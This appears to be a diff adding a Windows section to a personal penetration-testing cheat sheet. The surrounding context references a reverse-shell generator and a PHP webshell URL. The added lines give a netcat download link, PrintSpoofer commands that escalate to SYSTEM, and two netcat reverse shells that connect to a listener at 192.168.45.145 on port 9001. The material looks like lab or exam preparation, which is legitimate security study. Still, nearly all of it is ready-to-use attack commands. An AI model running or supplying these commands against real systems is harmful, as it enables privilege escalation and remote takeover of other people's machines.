@@ -58,3 +58,27 @@ Reverse Shell Generator https://www.revshells.com/
 # PHP One-liner webshell
 https://raw.githubusercontent.com/voidexec/sec/main/webshells/shell.php
 ```
+
+# Windows
+
+PrintSpoofer
+
+```powershell
+https://github.com/itm4n/PrintSpoofer/releases
+# Usage 1 - Spawning cmd interactive as system
+PrintSpoofer64.exe -i -c cmd
+# Usage 2 - Launching reverse shell as system
+PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 192.168.45.145 9001 -e powershell"
+```
+
+NC
+
+```powershell
+https://github.com/int0x33/nc.exe/
+# nc64.exe
+https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe
+# Reverse shell
+nc64.exe 192.168.45.145 9001 -e powershell
+```
+
+# Tunneling
